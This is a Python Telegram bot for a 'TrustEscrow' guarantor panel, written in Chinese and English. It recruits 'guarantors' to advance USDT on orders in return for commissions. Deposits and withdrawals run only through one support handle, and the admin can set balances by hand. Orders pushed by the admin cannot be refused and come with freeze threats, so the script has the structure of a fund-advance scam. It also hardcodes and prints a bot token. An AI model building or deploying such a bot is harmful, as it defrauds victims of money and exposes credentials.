# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime, timedelta
import random

# ===================== 配置（已填好你的Token，请勿修改）=====================
BOT_TOKEN = "8747559514:AAE_N9M9CallB4rYV0lbyny_0tGJnz3hLYU"
ADMIN_ID = 8401979801
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 数据存储 =====================
guarantor = {}       # 担保人数据 {id: {status, balance, commission, inviter, banned, name}}
orders = {}         # 订单数据 {code: {type, amount, buyer, seller, deadline, status, guar, commission}}
user_lang = {}
step = {}

# ===================== 双语高级文案 =====================
TEXT = {
    "zh": {
        "home": """🤝 TrustEscrow 中间人专区
【已认证中间人专属后台】
实时接单｜垫资结算｜佣金秒结

📊 佣金规则：
🔹 抢单利润：固定 5%
🔹 派单利润：15%~25%（按订单金额浮动）

⚠️ 平台规则：
● 派单强制接单，不可拒绝
● 派单需 12 小时内完成垫资
● 逾期未处理将冻结账号
● 违规操作永久封锁

安全 · 专业 · 长期稳定""",

        "not_verified": """⚠️ 您尚未成为认证中间人
请申请入驻并等待管理员审核。
需填写：真实资料 + 推荐人ID""",

        "banned": """❌ 您的账号已被管理员冻结
请联系客服：@fcff88""",

        "apply": """📝 申请成为中间人
请输入您的：真实姓名/昵称""",

        "apply_inviter": """📎 请输入推荐人ID
无推荐人请输入：0""",

        "apply_sent": """✅ 申请已提交成功
请等待管理员审核结果，审核通过后将通知您""",

        "balance": """👤 个人中心
ID：{}
姓名：{}
状态：{}
可用余额：{:.2f} USDT
累计佣金：{:.2f} USDT
推荐人：{}""",

        "deposit": """💰 储值入口
仅通过官方客服处理，保障资金安全。
➡️ 客服专线：@fcff88

储值流程：
1. 联系客服并提供您的用户ID
2. 选择储值金额与支付方式
3. 完成付款并提交截图
4. 资金即时到账，可立即使用

⚠️ 仅官方客服处理，其他渠道皆为诈骗""",

        "withdraw": """💳 提现入口
提现仅通过官方客服审核处理。
➡️ 客服专线：@fcff88

提现流程：
1. 联系客服并提供用户ID
2. 告知提现金额与收款方式
3. 等待管理员审核
4. 审核通过立即发放款项

⚠️ 账号需通过安全验证，禁止代提""",

        "grab_orders": """🚀 抢单大厅（利润5%）
{}

点击按钮抢单，先抢先得，抢完即止""",

        "no_grab": "📭 暂无可抢订单",

        "my_orders": """📋 我的订单
{}""",

        "no_my_orders": "📭 暂无进行中订单",

        "order_detail": """📥 订单详情
类型：{}
金额：{} USDT
佣金：{} USDT
买方：{}
卖方：{}
状态：{}
截止时间：{}

⚠️ 请按时完成垫资，逾期将冻结账号""",

        "fund_btn": "✅ 确认已垫资",
        "funded": "✅ 已确认垫资，等待结算",
        "back": "🏠 返回首页",
        "lang": "🌐 English",
    },
    "en": {
        "home": """🤝 TrustEscrow Guarantor Panel
【Verified Guarantors Only】
Real-time Orders · Fast Commission

📊 Commission Rules:
🔹 Grab Order Profit: 5% Fixed
🔹 Assign Order Profit: 15%~25%

⚠️ Platform Rules:
● Assigned orders CANNOT be refused
● Must fund within 12 hours
● Violation = Account Ban
● Fraud = Permanent Ban

Safe · Professional · Stable""",

        "not_verified": """⚠️ Not verified yet
Please apply and wait for admin approval.""",

        "banned": """❌ Your account is banned
Contact support: @fcff88""",

        "apply": """📝 Apply to be Guarantor
Enter your real name/nickname:""",

        "apply_inviter": """📎 Enter inviter ID (enter 0 if none):""",

        "apply_sent": """✅ Application submitted
Waiting for admin approval.""",

        "balance": """👤 Profile
ID: {}
Name: {}
Status: {}
Balance: {:.2f} USDT
Total Commission: {:.2f} USDT
Inviter: {}""",

        "deposit": """💰 Deposit
Only via official support: @fcff88""",

        "withdraw": """💳 Withdraw
Only via official support: @fcff88""",

        "grab_orders": """🚀 Grab Orders (5% Profit)
{}

Click to grab, first come first served""",

        "no_grab": "📭 No orders available",

        "my_orders": """📋 My Orders
{}""",

        "no_my_orders": "📭 No active orders",

        "order_detail": """📥 Order Details
Type: {}
Amount: {} USDT
Commission: {} USDT
Buyer: {}
Seller: {}
Status: {}
Deadline: {}""",

        "fund_btn": "✅ Confirm Funded",
        "funded": "✅ Confirmed, waiting settlement",
        "back": "🏠 Home",
        "lang": "🌐 繁中",
    }
}

# ===================== 菜单生成 =====================
def main_menu(u):
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("🚀 抢单大厅", callback_data="grab"),
        InlineKeyboardButton("📋 我的订单", callback_data="my"),
        InlineKeyboardButton("👤 个人中心", callback_data="bal"),
        InlineKeyboardButton("💰 储值", callback_data="dep"),
        InlineKeyboardButton("💳 提现", callback_data="wdr"),
        InlineKeyboardButton(t["lang"], callback_data="lang"),
    )
    return m

def back(u):
    t = TEXT[user_lang.get(u, "zh")]
    return InlineKeyboardMarkup().add(InlineKeyboardButton(t["back"], callback_data="home"))

def fund_btn(code):
    return InlineKeyboardMarkup().add(InlineKeyboardButton("✅ 确认已垫资", callback_data=f"fd_{code}"))

# ===================== 启动指令 =====================
@bot.message_handler(commands=['start'])
def start(msg):
    u = msg.from_user.id
    user_lang.setdefault(u, "zh")
    step[u] = None
    guarantor.setdefault(u, {
        "status": "none",    # none, applied, verified
        "balance": 0.0,
        "commission": 0.0,
        "inviter": 0,
        "banned": False,
        "name": "未设置"
    })
    t = TEXT[user_lang[u]]
    g = guarantor[u]
    if g["banned"]:
        bot.send_message(msg.chat.id, t["banned"])
        return
    if g["status"] != "verified":
        bot.send_message(msg.chat.id, t["not_verified"], reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("📝 申请入驻", callback_data="apply")
        ))
        return
    bot.send_message(msg.chat.id, t["home"], reply_markup=main_menu(u))

# ===================== 按钮回调 =====================
@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    u = c.from_user.id
    lang = user_lang.get(u, "zh")
    t = TEXT[lang]
    g = guarantor.get(u, {})
    mid = c.message.message_id
    cid = c.message.chat.id
    data = c.data

    try:
        if data == "home":
            bot.edit_message_text(t["home"], cid, mid, reply_markup=main_menu(u))

        elif data == "lang":
            user_lang[u] = "en" if lang == "zh" else "zh"
            bot.edit_message_text(TEXT[user_lang[u]]["home"], cid, mid, reply_markup=main_menu(u))

        elif data == "apply":
            step[u] = "apply_name"
            bot.edit_message_text(t["apply"], cid, mid, reply_markup=back(u))

        elif data == "bal":
            s = "✅ 已认证" if g["status"] == "verified" else "⚠️ 未认证"
            txt = t["balance"].format(u, g["name"], s, g["balance"], g["commission"], g["inviter"])
            bot.edit_message_text(txt, cid, mid, reply_markup=back(u))

        elif data == "dep":
            bot.edit_message_text(t["deposit"], cid, mid, reply_markup=back(u))
        elif data == "wdr":
            bot.edit_message_text(t["withdraw"], cid, mid, reply_markup=back(u))

        elif data == "grab":
            lst = [o for o in orders if orders[o]["type"] == "grab" and orders[o]["status"] == "open"]
            if not lst:
                bot.edit_message_text(t["grab_orders"].format(t["no_grab"]), cid, mid, reply_markup=back(u))
                return
            txt = "\n".join([f"• {o} {orders[o]['amount']} USDT" for o in lst[:6]])
            m = InlineKeyboardMarkup(row_width=2)
            for o in lst[:6]:
                m.add(InlineKeyboardButton(f"抢 {o}", callback_data=f"g_{o}"))
            bot.edit_message_text(t["grab_orders"].format(txt), cid, mid, reply_markup=m)

        elif data.startswith("g_"):
            code = data[2:]
            if code not in orders or orders[code]["status"] != "open":
                bot.answer_callback_query(c.id, "❌ 订单已被抢走")
                return
            o = orders[code]
            o["status"] = "progress"
            o["guar"] = u
            amt = o["amount"]
            com = amt * 0.05
            o["commission"] = com
            bot.answer_callback_query(c.id, "✅ 抢单成功！")
            bot.send_message(u, t["order_detail"].format("抢单", amt, com, o.get("buyer","-"), o.get("seller","-"), "处理中", o["deadline"]), reply_markup=fund_btn(code))

        elif data.startswith("fd_"):
            code = data[3:]
            if code not in orders:
                return
            o = orders[code]
            if o.get("guar") != u:
                return
            o["status"] = "funded"
            bot.edit_message_text(t["funded"], cid, mid, reply_markup=back(u))
            bot.send_message(ADMIN_ID, f"🔔 中间人{u} 已垫资订单 {code}，金额 {o['amount']} USDT")

        elif data == "my":
            lst = [o for o in orders if orders[o].get("guar") == u and orders[o]["status"] in ["progress", "funded"]]
            if not lst:
                bot.edit_message_text(t["my_orders"].format(t["no_my_orders"]), cid, mid, reply_markup=back(u))
                return
            txt = "\n".join([f"• {o} {orders[o]['amount']} USDT | {orders[o]['status']}" for o in lst[:6]])
            bot.edit_message_text(t["my_orders"].format(txt), cid, mid, reply_markup=back(u))

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(f"按钮错误: {e}")

# ===================== 用户输入处理 =====================
@bot.message_handler(func=lambda m: True)
def msg(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    if u not in step:
        step[u] = None

    # 申请流程：姓名
    if step[u] == "apply_name":
        step[u] = f"apply_inviter|{txt}"
        bot.send_message(u, TEXT[user_lang[u]]["apply_inviter"])
        return

    # 申请流程：推荐人
    elif str(step[u]).startswith("apply_inviter|"):
        name = step[u].split("|")[1]
        inv = txt
        try:
            inv_id = int(inv)
        except:
            inv_id = 0
        guarantor[u]["status"] = "applied"
        guarantor[u]["inviter"] = inv_id
        guarantor[u]["name"] = name
        bot.send_message(u, TEXT[user_lang[u]]["apply_sent"])
        bot.send_message(ADMIN_ID, f"🆕 新入驻申请\nID: {u}\n名称: {name}\n推荐人: {inv_id}")
        step[u] = None
        return

# ===================== 管理员专用指令 =====================
@bot.message_handler(func=lambda m: m.from_user.id == ADMIN_ID)
def admin(msg):
    t = msg.text.split()
    try:
        # 1. 通过认证 /verify ID
        if t[0] == "/verify":
            uid = int(t[1])
            guarantor[uid]["status"] = "verified"
            bot.send_message(uid, "✅ 您已成为认证中间人，欢迎使用！")
            bot.send_message(msg.chat.id, f"✅ 已通过用户 {uid} 的入驻申请")

        # 2. 封锁账号 /ban ID
        elif t[0] == "/ban":
            uid = int(t[1])
            guarantor[uid]["banned"] = True
            bot.send_message(uid, "❌ 您的账号已被管理员冻结")
            bot.send_message(msg.chat.id, f"✅ 已封锁用户 {uid}")

        # 3. 解封账号 /unban ID
        elif t[0] == "/unban":
            uid = int(t[1])
            guarantor[uid]["banned"] = False
            bot.send_message(uid, "✅ 您的账号已被管理员解封")
            bot.send_message(msg.chat.id, f"✅ 已解封用户 {uid}")

        # 4. 增加余额 /add ID 金额
        elif t[0] == "/add":
            uid = int(t[1])
            amt = float(t[2])
            guarantor[uid]["balance"] += amt
            bot.send_message(uid, f"✅ 您的账号已增加 {amt} USDT")
            bot.send_message(msg.chat.id, f"✅ 已给用户 {uid} 增加 {amt} USDT")

        # 5. 扣除余额 /reduce ID 金额
        elif t[0] == "/reduce":
            uid = int(t[1])
            amt = float(t[2])
            guarantor[uid]["balance"] -= amt
            bot.send_message(uid, f"❌ 您的账号已扣除 {amt} USDT")
            bot.send_message(msg.chat.id, f"✅ 已给用户 {uid} 扣除 {amt} USDT")

        # 6. 派单（不可拒绝，12小时限时）/assign 订单号 金额 买方ID 卖方ID 中间人ID
        elif t[0] == "/assign":
            code = t[1]
            amt = float(t[2])
            buyer = t[3]
            seller = t[4]
            gid = int(t[5])
            # 随机15%-25%佣金
            com_rate = random.choice([0.15, 0.18, 0.20, 0.22, 0.25])
            com = amt * com_rate
            deadline = (datetime.now() + timedelta(hours=12)).strftime("%m-%d %H:%M (GMT+8)")
            orders[code] = {
                "type": "assign",
                "amount": amt,
                "buyer": buyer,
                "seller": seller,
                "guar": gid,
                "status": "progress",
                "deadline": deadline,
                "commission": com
            }
            # 强制发送给中间人，不可拒绝
            bot.send_message(gid, TEXT[user_lang.get(gid, "zh")]["order_detail"].format("派单", amt, com, buyer, seller, "处理中", deadline), reply_markup=fund_btn(code))
            bot.send_message(msg.chat.id, f"✅ 已派单 {code} 给中间人 {gid}，佣金 {com:.2f} USDT")

        # 7. 创建抢单（≤50USDT，偶尔60/100）/grab 订单号 金额
        elif t[0] == "/grab":
            code = t[1]
            amt = float(t[2])
            orders[code] = {
                "type": "grab",
                "amount": amt,
                "status": "open",
                "deadline": "-",
                "buyer": "-",
                "seller": "-"
            }
            bot.send_message(msg.chat.id, f"✅ 已创建抢单 {code}，金额 {amt} USDT")

        else:
            bot.send_message(msg.chat.id, "❌ 未知指令，请检查格式")

    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ 指令格式错误，错误信息: {e}")

# ===================== 启动机器人 =====================
if __name__ == "__main__":
    print("✅ 中间人端机器人启动成功！")
    print(f"🤖 机器人: @MyEscrowBot88bot")
    print(f"🔑 Token: {BOT_TOKEN}")
    bot.infinity_polling()
